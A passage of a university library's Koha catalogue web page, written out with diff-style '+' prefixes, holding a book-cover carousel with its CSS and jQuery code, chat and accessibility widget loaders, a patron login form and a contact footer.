+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/La investigación cualitativa el uso de la minería de textos en redes sociales.jpg" title="La investigación cualitativa el uso de la minería de textos en redes sociales" alt="La investigación cualitativa el uso de la minería de textos en redes sociales"/></a> 
+
+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/Educación para la salud con las comunidades una experiencia de educación popular.jpg" title="Educación para la salud con las comunidades una experiencia de educación popular" alt="Educación para la salud con las comunidades: una experiencia de educación popular"/></a> 
+
+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/Pelajes criollos en patagonia.jpg" title="Pelajes criollos en patagonia" alt="Pelajes criollos en patagonia"/></a> 
+
+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/Manual para laboratorios de hidráulica de tuberías y canales abiertos.jpg" title="Manual para laboratorios de hidráulica de tuberías y canales abiertos" alt="Manual para laboratorios de hidráulica de tuberías y canales abiertos"/></a> 
+
+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/Molecular Tools for Disease Detection Trends and Developments.jpg" title="Molecular Tools for Disease Detection Trends and Developments" alt="Molecular Tools for Disease Detection Trends and Developments"/></a> 
+
+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/Everglades Wild Guide.jpg" title="Everglades Wild Guide" alt="Everglades Wild Guide"/></a> 
+
+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/Implantación de aplicaciones web en entornos internet, intranet y extranet. IFCD0210.jpg" title="Implantación de aplicaciones web en entornos internet, intranet y extranet. IFCD0210" alt="Implantación de aplicaciones web en entornos internet, intranet y extranet. IFCD0210"/></a> 
+
+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/Nefronut la alimentación en la enfermedad renal crónica explicada de forma gráfica infografías para pacientes, cuidadores y profesionales de la salud.jpg" title="Nefronut la alimentación en la enfermedad renal crónica explicada de forma gráfica infografías para pacientes, cuidadores y profesionales de la salud" alt="Nefronut: la alimentación en la enfermedad renal crónica explicada de forma gráfica infografías para pacientes, cuidadores y profesionales de la salud"/></a> 
+
+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/Marketing 6.0 el futuro es inmersivo.jpg" title="Marketing 6.0 el futuro es inmersivo" alt="Marketing 6.0: el futuro es inmersivo"/></a> 
+
+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/Manual de prácticas para áreas básicas y aplicadas la ingeniería a un paso del laboratorio.jpg" title="Manual de prácticas para áreas básicas y aplicadas la ingeniería a un paso del laboratorio" alt="Manual de prácticas para áreas básicas y aplicadas la ingeniería a un paso del laboratorio"/></a> 
+
+  
+  
+
+<div class="carousel-caption">
+<p class="title-text"></p>
+</div>
+</div>
+</div>
+</div>
+<style>
+
+#inlibro-carrousel .carrouselFrame {
+    background: #DDDDDD;
+    border-radius: 8px;
+    margin: 1em 0;
+    overflow: hidden;
+    padding: 1em 0;
+    position: relative;
+}
+
+#inlibro-carrousel .carrousel{
+    height : 375px;
+}
+
+#inlibro-carrousel .loadingDiv{
+    background : white;
+    position : absolute;
+    height : 100%;
+    width : 100%;
+    z-index : 2000;
+    top : 0;
+
+}
+
+ /*De bootstrap pour le carrousel*/
+  
+.carousel {
+    position: relative;
+    margin-bottom: 20px;
+    line-height: 1;
+}
+
+.carousel-inner {
+    overflow: hidden;
+    width: 100%;
+    position: relative;
+}
+
+.carousel-inner>.item {
+    display: none;
+    position: relative;
+    -webkit-transition: 0.6s ease-in-out left;
+    -moz-transition: 0.6s ease-in-out left;
+    -o-transition: 0.6s ease-in-out left;
+    transition: 0.6s ease-in-out left;
+}
+
+.carousel-inner>.item>img, .carousel-inner>.item>a>img {
+    display: block;
+    line-height: 1;
+}
+
+.carousel-inner>.active, .carousel-inner>.next, .carousel-inner>.prev {
+    display: block;
+}
+
+.carousel-inner>.active {
+    left: 0;
+}
+
+.carousel-inner>.next, .carousel-inner>.prev {
+    position: absolute;
+    top: 0;
+    width: 100%;
+}
+
+.carousel-inner>.next {
+    left: 100%;
+}
+
+.carousel-inner>.prev {
+    left: -100%;
+}
+
+.carousel-inner>.next.left, .carousel-inner>.prev.right {
+    left: 0;
+}
+
+.carousel-inner>.active.left {
+    left: -100%;
+}
+
+.carousel-inner>.active.right {
+    left: 100%;
+}
+
+.carousel-control {
+    position: absolute;
+    top: 40%;
+    left: 15px;
+    width: 40px;
+    height: 50px;
+    margin-top: -20px;
+    font-size: 60px;
+    font-weight: 100;
+    line-height: 30px;
+    color: #ffffff;
+    text-align: center;
+    background: #222222;
+    border: 3px solid #ffffff;
+    -webkit-border-radius: 23px;
+    -moz-border-radius: 23px;
+    border-radius: 23px;
+    opacity: 0.5;
+    filter: alpha(opacity=50);
+}
+
+.carousel-control.right {
+    left: auto;
+    right: 15px;
+}
+
+.carousel-control:hover, .carousel-control:focus {
+    color: #ffffff;
+    text-decoration: none;
+    opacity: 0.9;
+    filter: alpha(opacity=90);
+}
+
+.carousel-indicators {
+    position: absolute;
+    top: 15px;
+    right: 15px;
+    z-index: 5;
+    margin: 0;
+    list-style: none;
+}
+
+.carousel-indicators li {
+    display: block;
+    float: left;
+    width: 10px;
+    height: 10px;
+    margin-left: 5px;
+    text-indent: -999px;
+    background-color: #ccc;
+    background-color: rgba(255, 255, 255, 0.25);
+    border-radius: 5px;
+}
+
+.carousel-indicators .active {
+    background-color: #fff;
+}
+
+.carousel-caption {
+    position: absolute;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    padding: 15px;
+    background: #333333;
+    background: rgba(0, 0, 0, 0.75);
+}
+
+.carousel-caption h4, .carousel-caption p {
+    color: #ffffff;
+    line-height: 20px;
+}
+
+.carousel-caption h4 {
+    margin: 0 0 5px;
+}
+
+.carousel-caption p {
+    margin-bottom: 0;
+}
+  
+    /*De bootstrap pour le carrousel FIN*/
+
+
+#inlibro-carrousel .carousel-caption .title-text{
+    color : #ffE4D6;
+}
+
+#inlibro-carrousel .carousel-control,
+#inlibro-carrousel .carousel-caption{
+    background-color : #547114;
+    z-index:1000;
+    cursor : pointer;
+}
+
+#inlibro-carrousel .carousel-caption{
+    font-weight : bold;
+    position: absolute;
+    left: 0;
+    right: 0;
+}
+
+#inlibro-carrousel .carousel-control,
+#inlibro-carrousel .carousel-caption{
+    background-color : #547114;
+    z-index:1000;
+}
+
+#inlibro-carrousel .carousel-caption{
+    font-weight : bold;
+}
+
+#inlibro-carrousel a.locked{
+    width:100px;
+}
+
+#inlibro-carrousel .slider {
+    overflow: hidden;
+}
+
+#inlibro-carrousel .slider img {
+    height: 175px;
+}
+
+#inlibro-carrousel .slider hr + div {
+    background-color: #d5e1df;
+}
+
+#inlibro-carrousel .special-title{ 
+    text-align: center;
+    margin: 0;
+    margin-top: 10px;
+    margin-bottom: 35px;
+    font-weight: bold;
+    font-style: italic;
+    font-size: 25px;
+    color:black;
+}
+
+#inlibro-carrousel hr{
+    margin: -5px 0px 15px 0px;
+}
+
+#inlibro-carrousel h2 {
+    color: black;
+}
+
+#inlibro-carrousel .images {
+    left: 0px;
+    position: relative;
+    white-space: nowrap;
+
+}
+
+#inlibro-carrousel .controls{
+    margin-bottom: 115px;
+    margin-top: 20px;
+}
+
+#inlibro-carrousel button{
+    color : #ffE4D6;
+    background-color: #547114;
+    border: 0;
+    height : 2em;
+    font-size: 120%;
+    border-radius : 3px;
+}
+
+#inlibro-carrousel .images a {
+    display: inline-block;
+    margin-right: 5px;
+}
+</style>
+<!-- This is the cloud carousel javascript(cloud-carousel.1.0.0.js) -->
+<script>
+//////////////////////////////////////////////////////////////////////////////////
+// CloudCarousel V1.0.5
+// (c) 2011 by R Cecco. <http://www.professorcloud.com>
+// MIT License
+//
+// Reflection code based on plugin by Christophe Beyls <http://www.digitalia.be>
+//
+// Please retain this copyright header in all versions of the software
+//////////////////////////////////////////////////////////////////////////////////
+document.addEventListener('DOMContentLoaded', function() {
+    (function($){function Reflection(img,reflHeight,opacity){var reflection,cntx,imageWidth=img.width,imageHeight=img.width,gradient,parent;parent=$(img.parentNode);this.element=reflection=parent.append("<canvas class='reflection' style='position:absolute'/>").find(':last')[0];if(!reflection.getContext&&$.support.msie){this.element=reflection=parent.append("<img class='reflection' style='position:absolute'/>").find(':last')[0];reflection.src=img.src;reflection.style.filter="flipv progid:DXImageTransform.Microsoft.Alpha(opacity="+(opacity*100)+", style=1, finishOpacity=0, startx=0, starty=0, finishx=0, finishy="+(reflHeight/imageHeight*100)+")"}else{cntx=reflection.getContext("2d");try{$(reflection).attr({width:imageWidth,height:reflHeight});cntx.save();cntx.translate(0,imageHeight-1);cntx.scale(1,-1);cntx.drawImage(img,0,0,imageWidth,imageHeight);cntx.restore();cntx.globalCompositeOperation="destination-out";gradient=cntx.createLinearGradient(0,0,0,reflHeight);gradient.addColorStop(0,"rgba(255, 255, 255, "+(1-opacity)+")");gradient.addColorStop(1,"rgba(255, 255, 255, 1.0)");cntx.fillStyle=gradient;cntx.fillRect(0,0,imageWidth,reflHeight)}catch(e){return}}$(reflection).attr({'alt':$(img).attr('alt'),title:$(img).attr('title')})}var Item=function(imgIn,options){this.orgWidth=imgIn.width;this.orgHeight=imgIn.height;this.image=imgIn;this.reflection=null;this.alt=imgIn.alt;this.title=imgIn.title;this.imageOK=false;this.options=options;this.imageOK=true;if(this.options.reflHeight>0){this.reflection=new Reflection(this.image,this.options.reflHeight,this.options.reflOpacity)}$(this.image).css('position','absolute')};var Controller=function(container,images,options){var items=[],funcSin=Math.sin,funcCos=Math.cos,ctx=this;this.controlTimer=0;this.stopped=false;this.container=container;this.xRadius=options.xRadius;this.yRadius=options.yRadius;this.showFrontTextTimer=0;this.autoRotateTimer=0;if(options.xRadius===0){this.xRadius=($(container).width()/2.3)}if(options.yRadius===0){this.yRadius=($(container).height()/6)}this.xCentre=options.xPos;this.yCentre=options.yPos;this.frontIndex=0;this.rotation=this.destRotation=Math.PI/2;this.timeDelay=1000/options.FPS;if(options.altBox!==null){$(options.altBox).css('display','block');$(options.titleBox).css('display','block')}$(container).css({position:'relative',overflow:'hidden'});$(options.buttonLeft).css('display','inline');$(options.buttonRight).css('display','inline');$(options.buttonLeft).bind('mouseup',this,function(event){event.data.rotate(-1);return false});$(options.buttonRight).bind('mouseup',this,function(event){event.data.rotate(1);return false});if(options.mouseWheel){$(container).bind('mousewheel',this,function(event,delta){event.data.rotate(delta);return false})}$(container).bind('mouseover click',this,function(event){clearInterval(event.data.autoRotateTimer);var text=$(event.target).attr('alt');if(text!==undefined&&text!==null){clearTimeout(event.data.showFrontTextTimer);$(options.altBox).html(($(event.target).attr('alt')));$(options.titleBox).html(($(event.target).attr('title')));if(options.bringToFront&&event.type=='click'){var idx=$(event.target).data('itemIndex');var frontIndex=event.data.frontIndex;var diff=(idx-frontIndex)%images.length;if(Math.abs(diff)>images.length/2){diff+=(diff>0?-images.length:images.length)}event.data.rotate(-diff)}}});$(container).bind('mouseout',this,function(event){var context=event.data;clearTimeout(context.showFrontTextTimer);context.showFrontTextTimer=setTimeout(function(){context.showFrontText()},1000);context.autoRotate()});$(container).bind('mousedown',this,function(event){event.data.container.focus();return false});container.onselectstart=function(){return false};this.innerWrapper=$(container).wrapInner('<div style="position:absolute;width:100%;height:100%;"/>').children()[0];this.showFrontText=function(){if(items[this.frontIndex]===undefined){return}$(options.titleBox).html($(items[this.frontIndex].image).attr('title'));$(options.altBox).html($(items[this.frontIndex].image).attr('alt'))};this.go=function(){if(this.controlTimer!==0){return}var context=this;this.controlTimer=setTimeout(function(){context.updateAll()},this.timeDelay)};this.stop=function(){clearTimeout(this.controlTimer);this.controlTimer=0};
+
+    this.rotate=function(direction){
+        this.frontIndex-=direction;
+        while (this.frontIndex<0) { this.frontIndex += items.length; }
+        this.frontIndex%=items.length;
+        this.destRotation+=(Math.PI/items.length)*(2*direction);
+        this.showFrontText();
+        this.go()
+    };
+
+    this.autoRotate=function(){
+        if(options.autoRotate!=='no'){
+            var dir=(options.autoRotate==='right')?1:-1;
+            this.autoRotateTimer=setInterval(function(){ctx.rotate(dir)},options.autoRotateDelay)}};
+            this.updateAll=function(){var minScale=options.minScale;
+            var smallRange=(1-minScale)*0.5;
+            var w,h,x,y,scale,item,sinVal;
+            var change=(this.destRotation-this.rotation);
+            var absChange=Math.abs(change);
+            this.rotation+=change*options.speed;
+            if(absChange<0.001){this.rotation=this.destRotation}
+            var itemsLen=items.length;
+            var spacing=(Math.PI/itemsLen)*2;
+            var radians=this.rotation;
+            var isMSIE=$.support.msie;
+            this.innerWrapper.style.display='none';
+            var style;var px='px',reflHeight;
+            var context=this;
+            for(var i=0;i<itemsLen;i++){item=items[i];sinVal=funcSin(radians);
+            scale=((sinVal+1)*smallRange)+minScale;
+            x=this.xCentre+(((funcCos(radians)*this.xRadius)-(item.orgWidth*0.5))*scale);
+            y=this.yCentre+(((sinVal*this.yRadius))*scale);
+            if(item.imageOK){var img=item.image;
+            w=img.width=item.orgWidth*scale;
+            h=img.height=item.orgHeight*scale;
+            img.style.left=x+px;
+            img.style.top=y+px;img.style.zIndex=""+(scale*100)>>0;
+            if(item.reflection!==null){reflHeight=options.reflHeight*scale;
+            style=item.reflection.element.style;style.left=x+px;
+            style.top=y+h+options.reflGap*scale+px;
+            style.width=w+px;
+            if(isMSIE){style.filter.finishy=(reflHeight/h*100)}else{style.height=reflHeight+px}}}radians+=spacing}this.innerWrapper.style.display='block';if(absChange>=0.001){this.controlTimer=setTimeout(function(){context.updateAll()},this.timeDelay)}else{this.stop()}};this.checkImagesLoaded=function(){var i;for(i=0;i<images.length;i++){if((images[i].width===undefined)||((images[i].complete!==undefined)&&(!images[i].complete))){return}}for(i=0;i<images.length;i++){items.push(new Item(images[i],options));$(images[i]).data('itemIndex',i)}clearInterval(this.tt);this.showFrontText();this.autoRotate();this.updateAll()};this.tt=setInterval(function(){ctx.checkImagesLoaded()},50)};$.fn.CloudCarousel=function(options){this.each(function(){options=$.extend({},{reflHeight:0,reflOpacity:0.5,reflGap:0,minScale:0.5,xPos:0,yPos:0,xRadius:0,yRadius:0,altBox:null,titleBox:null,FPS:30,autoRotate:'no',autoRotateDelay:1500,speed:0.2,mouseWheel:false,bringToFront:false},options);$(this).data('cloudcarousel',new Controller(this,$('.cloudcarousel',$(this)),options))});return this}})(jQuery);
+
+    //This initialises carousels on the container elements specified.
+    
+        
+            $("#carrousel-0").each(function (){
+                var controls = $(this).find(".carousel-control");
+                $(this).CloudCarousel(
+                {
+                    
+                    xPos : $(this).parent().width() * 0.5,
+                    yPos : 10,
+                    xRadius : $(this).parent().width() / 2,
+                    yRadius : $(this).parent().height() / 7,
+                    buttonLeft: $(controls).filter(".left"),
+                    buttonRight: $(controls).filter(".right"),
+                    titleBox: $(this).find(".title-text"),
+                    minScale: 0.25,
+                    reflHeight : 40,
+                    reflGap : 4,
+                    reflOpacity : 0.75
+                }
+                );
+            });
+        
+    
+
+    $(".loadingDiv").delay(1000);
+    $(".loadingDiv").fadeOut(1000);
+});
+</script>
+<script>
+var scrolling_duration = 250;
+var time_between_scrolling = 5000;
+
+
+function Left (button){
+    let container =  document.getElementById(button.className).getElementsByClassName("images")[0];
+    let livres = container.children;
+
+    var last = $(container).find("a img").last();
+    if ($(last).position().left + $(last)[0].clientWidth < $(".slider")[0].clientWidth) return;
+    $(container).animate({
+        left: $(container).find("a img").eq(1).position().left * -1,
+    }, scrolling_duration, function() {
+        $(container).css("left", "0");
+        $(container).append($(container).find("a").first());
+    });  
+};
+function Right (button){
+    let container =  document.getElementById(button.className).getElementsByClassName("images")[0];
+    let livres = container.children;
+
+    var last = $(container).find("a img").last();
+    if ($(last).position().left + $(last)[0].clientWidth < $(".slider")[0].clientWidth) return;
+    $(container).animate({
+        left: $(container).find("a img").eq(1).position().left,
+    }, scrolling_duration, function() {
+        $(container).css("left", "0");
+        $(container).prepend($(container).find("a").last());
+    });
+};
+
+/*
+window.addEventListener('load', function() {
+    function setPosition() {
+        $(".images").each(function(i) {
+            var last = $(this).find("a img").last();
+            if ($(last).position().left + $(last)[0].clientWidth < $("#sliders")[0].clientWidth) return;
+            $(this).animate({
+                left: $(this).find("a img").eq(1).position().left * -1,
+            }, scrolling_duration, function() {
+                $(this).css("left", "0");
+                $(this).append($(this).find("a").first());
+            });
+        });
+    }
+    //setInterval(setPosition, time_between_scrolling);
+});
+*/
+</script>
+<!-- Fin du carrousel --> <!--  CHAT -->
+<script src="../cdn.botpress.cloud/webchat/v1/inject.js"></script>
+<script>
+  window.botpressWebChat.init({
+      "composerPlaceholder": "Cual es tu Pregunta ?",
+      "botConversationDescription": "Estamos para ayudarte",
+      "botId": "fab1d04a-032a-48fc-a35b-82a6d3a3a0d5",
+      "hostUrl": "https://cdn.botpress.cloud/webchat/v1",
+      "messagingUrl": "https://messaging.botpress.cloud",
+      "clientId": "fab1d04a-032a-48fc-a35b-82a6d3a3a0d5",
+      "webhookId": "b6d48c97-7796-4d15-8232-416fa0d71c40",
+      "lazySocket": true,
+      "themeName": "prism",
+      "botName": "BiblioESPOCH",
+      "avatarUrl": "https://cdn-icons-png.freepik.com/256/2593/2593627.png",
+      "emailAddress": "biblioteca@espoch.edu.ec",
+      "stylesheet": "https://webchat-styler-css.botpress.app/prod/98c69239-bb50-41ef-9011-49ed480c1b31/v13629/style.css",
+      "frontendVersion": "v1",
+      "useSessionStorage": true,
+      "showBotInfoPage": true,
+      "theme": "prism",
+      "themeColor": "#2563eb",
+      "allowedOrigins": []
+  });
+</script>
+<!--  ACCESIBILIDAD -->
+<script>
+    (function(d){
+      var s = d.createElement("script");
+      /* uncomment the following line to override default position*/
+      /* s.setAttribute("data-position", 3);*/
+      /* uncomment the following line to override default size (values: small, large)*/
+      /* s.setAttribute("data-size", "small");*/
+      /* uncomment the following line to override default language (e.g., fr, de, es, he, nl, etc.)*/
+      /* s.setAttribute("data-language", "language");*/
+      /* uncomment the following line to override color set via widget (e.g., #053f67)*/
+       s.setAttribute("data-color", "#e8e811");
+      /* uncomment the following line to override type set via widget (1=person, 2=chair, 3=eye, 4=text)*/
+      /* s.setAttribute("data-type", "1");*/
+      /* s.setAttribute("data-statement_text:", "Our Accessibility Statement");*/
+      /* s.setAttribute("data-statement_url", "http://www.example.com/accessibility")";*/
+      /* uncomment the following line to override support on mobile devices*/
+      /* s.setAttribute("data-mobile", true);*/
+      /* uncomment the following line to set custom trigger action for accessibility menu*/
+      /* s.setAttribute("data-trigger", "triggerId")*/
+      s.setAttribute("data-account", "HUe9u4dWvR");
+      s.setAttribute("src", "../cdn.userway.org/widget.js");
+      (d.body || d.head).appendChild(s);
+    })(document)
+    </script></div>
+ </div>
+ 
+ </div>
+ 
+
+ 
+ 
+
+ </div> <!-- / .col 6/8 -->
+
+ 
+ <div class="col-12 col-lg-3 order-md-2">
+ 
+ 
+ 
+ <div id="login">
+ <form action="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-user.pl" method="post" name="auth" id="auth" autocomplete="off">
+ <input type="hidden" name="koha_login_context" value="opac" />
+ <fieldset class="brief">
+ <legend>Ingrese a su cuenta:</legend>
+ 
+ <div class="local-login">
+ <label for="userid">Usuario:</label>
+ <input class="form-control" type="text" id="userid" name="userid" autocomplete="off" />
+ <label for="password">Contraseña:</label>
+ <input class="form-control" type="password" id="password" name="password" autocomplete="off" />
+ <fieldset class="action">
+ <input class="btn btn-primary" type="submit" value="Ingresar" />
+ </fieldset>
+ </div>
+ 
+ <div id="nologininstructions-main" class="nologininstructions">
+ 
+ 
+ <div id="OpacLoginInstructions">
+ 
+ <div class="default_item">
+ 
+ <div class="default_body"><center>Esta cuenta se refiere exclusivamente a Biblioteca Física</center></div>
+ </div>
+ 
+ </div>
+ 
+
+ </div>
+ 
+ 
+ <div id="forgotpassword-main" class="forgotpassword">
+ <p><a href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-password-recovery.pl">¿Olvidó su contraseña?</a></p>
+ </div>
+ 
+ 
+ </fieldset>
+ </form>
+ </div> <!-- /#login -->
+ 
+ 
+ 
+ 
+ 
+ <div id="OpacNavRight">
+ 
+ <div class="default_item">
+ 
+ <div class="default_body"><div class="alert alert-warning" role="alert" align="center"><strong> REBUEP </strong></div>
+<div class="alert alert-success" role="alert">
+<p style="text-align: center;"><span style="font-size: 10pt;">Acceso al cat&aacute;logo integrado de m&aacute;s de 40 bibliotecas a nivel nacional.</span><br /><a href="https://www.rebuep.net/" target="_blank" rel="noopener"><button type="button" class="btn btn-outline-success">Accede al sitio web </button> </a></p>
+</div></div>
+ </div>
+ 
+ </div>
+ 
+
+ </div> <!-- / .col -->
+ 
+
+ </div> <!-- /.container-fluid -->
+ </div> <!-- /.row -->
+</div> <!-- /.main -->
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+ 
+ <div class="container-fluid">
+ <div class="row">
+ <div class="col">
+ 
+ 
+ <div id="opaccredits">
+ 
+ <div class="default_item">
+ 
+ <div class="default_body"><!-- footer -->
+    <div class="footer-area">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-4 col-md-6" align="center">
+              <img src="https://biblioteca.espoch.edu.ec/assets/img/logo/Logo Dbra Plomo.png" width="25%" alt="Logo DBRAI">
+              <div class="footer-box pages1" align="justify">
+                <ul>
+                  <li><a href="index.html">Inicio</a></li>
+                </ul>
+                <ul>
+                  <li><a href="http://dspace.espoch.edu.ec/">Repositorio</a></li>
+                </ul>
+                <ul>
+                  <li><a href="https://biblioteca.espoch.edu.ec/formacion.html">Formación de Usuarios</a></li>
+                </ul>
+                <ul>
+                  <li><a href="https://biblioteca.espoch.edu.ec/ttitulacion.html">Trabajo de Titulación</a></li>
+                </ul>
+                <ul>
+                  <li><a>Contactos</a></li>
+                </ul>
+              </div>
+            </div>
+            <div class="col-lg-4 col-md-6" align="justify">
+              <div class="contact-form-box">
+                <h4>
+                  <img src="iconos/ubicacion.png" alt="Ubicación" style="width: 20px; height: 20px;">
+                  Riobamba, Ecuador
+                </h4>
+                <p>Panamericana Sur Km 1 1/2</p>
+              </div>
+              <div class="contact-form-box">
+                <h4>
+                  <img src="iconos/telefono.png" alt="Teléfono" style="width: 20px; height: 20px;">
+                  593(03) 2998-200
+                </h4>
+                <p>Ext 1066</p>
+              </div>
+              <div class="contact-form-box">
+                <h4>
+                  <img src="iconos/correo.png" alt="Correo electrónico" style="width: 20px; height: 20px;">
+                  biblioteca@espoch.edu.ec
+                </h4>
+                <p>Recursos de la Información</p>
+              </div>
+            </div>
+            
+            <div class="col-lg-4 col-md-6" align="justify">
+              <div class="footer-box get-in-touch" align="center">
+                <h3 class="widget-title" style="color: #fff;">DBRAI</h3>
+                <br>
+                <p style="color: #fff;" align="justify">Dirección de Bibliotecas y Recursos para el Aprendizaje y la Investigación / Unidad de Gestión de la Información</p>
+                <br><br>
+                <div class="social-icons">
+                  <ul>
+                    <li>
+                      <a href="https://www.facebook.com/bibliotecaespoch" target="_blank" rel="noopener">
+                        <img src="iconos/facebook.png" alt="Facebook" style="width: 16px; height: 16px;">
+                      </a>
+                    </li>
+                  </ul>
+                </div>
+              </div>      
+            </div>
+          </div> <!-- end footer --> 
+          
+          <div class="copyright">
+            <div class="container">
+            <div class="row">
+            <div class="col-lg-12 ">
+            <p align="center"><a href="https://biblioteca.espoch.edu.ec">DBRAI</a> - UGI © 2024</p>
+            </div>
+            </div>
+            </div>
+            </div>
+        </div>
+      </div>
+      
+ </div>
+ </div>
+ </div>
+ </div>
+ <div class="container-fluid">
+ <div class="row">
+ <div class="col">
+ <div id="report-koha-url">
+ <div class="row justify-content-between">
+ 
+ 
+ <div class="col">
+ <div id="koha_url" class="clearfix noprint">
+ <p>Con tecnología  <a class="koha_url" href="http://koha-community.org/">Koha</a>
+ </p>
+ </div> <!-- /#koha_url -->
+ </div> <!-- /.col -->
+ 
+ </div> <!-- /.row.justify-content-between -->
+ </div> <!-- /#report-koha-url -->
+ </div> <!-- /.col -->
+ </div> <!-- /.row -->
+ </div> <!-- /.container-fluid -->
+ 
+ </div> <!-- / #wrapper in masthead.inc -->
+
+<!-- JavaScript includes -->
+<script src="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/lib/jquery/jquery-3.6.0.min_22.0506000.js"></script>
+<script src="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/lib/jquery/jquery-migrate-3.3.2.min_22.0506000.js"></script>
+<script src="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/lib/jquery/jquery-ui-1.13.1.min_22.0506000.js"></script>
+<script src="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/lib/bootstrap/js/bootstrap.bundle.min_22.0506000.js"></script>
+<script src="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/lib/fontfaceobserver.min_22.0506000.js"></script>
+<script src="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/lib/enquire.min_22.0506000.js"></script>
+<script src="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/js/global_22.0506000.js"></script>
+
+
+<script>
+
+    var MSG_CONFIRM_AGAIN = _("Advertencia: No puede deshacerse. Por favor confirmar nuevamente")
+    var MSG_DELETE_SEARCH_HISTORY = _("¿Está seguro que desea eliminar su historial de búsqueda?");
+    var MSG_NO_SUGGESTION_SELECTED = _("No se seleccionó ninguna sugerencia");
+    var MSG_SEARCHING = _("Buscando %s...");
+    var MSG_ERROR_SEARCHING_COLLECTION = _("Error de la búsqueda en la colección %s");
+    var MSG_NO_RESULTS_FOUND_IN_COLLECTION = _("No se han encontrado resultados en la colección de la biblioteca %s");
+    var MSG_RESULTS_FOUND_IN_COLLECTION = _("Se encontraron %s resultados en la colección de la biblioteca %s");
+    var MSG_BY = _("por");
+    var MSG_TYPE = _("Tipo");
+    var MSG_NEXT = _("Siguiente");
+    var MSG_PREVIOUS = _("Previo");
+    var MSG_CHECKOUTS = _("Préstamos");
+    var MSG_NO_CHECKOUTS = _("Sin préstamos");
+    var MSG_CHECK_OUT = _("Préstamo");
+    var MSG_CHECK_OUT_CONFIRM = _("¿Está seguro de querer prestar esta éste ítem?");
+    var MSG_CHECKED_OUT_UNTIL = _("Prestado hasta %s");
+    var MSG_CHECK_IN = _("Devolución");
+    var MSG_CHECK_IN_CONFIRM = _("¿Está seguro de querer devolver éste ítem?");
+    var MSG_NO_CHECKOUTS = _("Sin préstamos");
+    var MSG_DOWNLOAD = _("Bajar");
+    var MSG_HOLDS = _("Reservas");
+    var MSG_NO_HOLDS = _("Sin reservas");
+    var MSG_PLACE_HOLD = _("Hacer reserva");
+    var MSG_CANCEL_HOLD = _("Cancelar");
+    var MSG_CANCEL_HOLD_CONFIRM = _("¿Está seguro que desea cancelar esta reserva?");
+    var MSG_ON_HOLD = _("Reservado");
+
+    
+        var MSG_TAGS_DISABLED = _("Lo sentimos, las etiquetas no están habilitadas en este sistema.");
+        var MSG_TAG_ALL_BAD = _("Error! Su etiqueta tenía código ilegal. NO ha sido agregada. Intente nuevamente con texto plano.");
+        var MSG_ILLEGAL_PARAMETER = _("¡Error! Parámetro ilegal");
+        var MSG_TAG_SCRUBBED = _("Nota: su etiqueta contenía código que fue removido. La etiqueta fue agregada como ");
+        var MSG_ADD_TAG_FAILED = _("¡Error! La adición de etiquetas falló en");
+        var MSG_ADD_TAG_FAILED_NOTE = _("Nota: solo puede etiquetar un ítem con determinado término una vez. Vea 'Mis Etiquetas' para ver sus etiquetas actuales.");
+        var MSG_DELETE_TAG_FAILED = _("Error! No puede eliminar la etiqueta");
+        var MSG_DELETE_TAG_FAILED_NOTE = _("Nota: sólo puede eliminar sus propias etiquetas.")
+        var MSG_LOGIN_REQUIRED = _("Debe ingresar a su cuenta para agregar etiquetas.");
+        var MSG_TAGS_ADDED = _("Etiquetas agregadas: ");
+        var MSG_TAGS_DELETED = _("Etiquetas agregadas: ");
+        var MSG_TAGS_ERRORS = _("Errores: ");
+        var MSG_MULTI_ADD_TAG_FAILED = _("No se pudo agregar una o más etiquetas.");
+        var MSG_NO_TAG_SPECIFIED = _("No se especificó etiqueta.");
+    
+    
+    
+
+    
+    $(".print-large").on("click",function(){
+        window.print();
+        return false;
+    });
+    $(".addtoshelf").on("click",function(e){
+        e.preventDefault();
+        Dopop( this.href );
+    });
+    $("body").on("click", ".addtocart", function(e){
+        e.preventDefault();
+        var biblionumber = $(this).data("biblionumber");
+        addRecord( biblionumber );
+    });
+    $("body").on("click", ".cartRemove", function(e){
+        e.preventDefault();
+        var biblionumber = $(this).data("biblionumber");
+        delSingleRecord( biblionumber );
+    });
+    $(".clearsh").on("click", function(){
+        return confirmDelete(MSG_DELETE_SEARCH_HISTORY);
+    });
+
+</script>
+
+
+ <script src="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/js/basket_22.0506000.js"></script>
+
+
+<script src="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/js/tags_22.0506000.js"></script>
+
+ <script src="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/js/google-jackets_22.0506000.js"></script>
+ <script>
+
